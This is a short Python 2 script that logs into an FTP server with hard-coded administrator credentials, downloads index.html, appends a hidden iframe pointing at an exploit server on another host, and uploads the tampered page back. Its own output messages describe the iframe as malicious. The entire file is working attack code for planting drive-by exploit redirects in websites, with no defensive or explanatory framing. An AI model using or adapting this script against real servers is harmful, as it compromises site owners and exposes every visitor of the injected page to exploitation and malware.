#!/usr/bin/python
import ftplib
def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Download Page: ' + page
	f.write(redirect)
	f.close()
	try:
		print '[+] Injected Malicious IFrame on : ' + page
		ftp.storlines('STOR ' + page, open(page + '.tmp'))
		print '[+] Uploaded Injected Page: ' + page
	except Exception as ex:
		print str(ex)
host = '192.168.1.130'
userName = 'Administrator'
passWord = 'hacked'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src="http://192.168.1.135:8080/exploit"></iframe>'
injectPage(ftp, 'index.html',redirect)

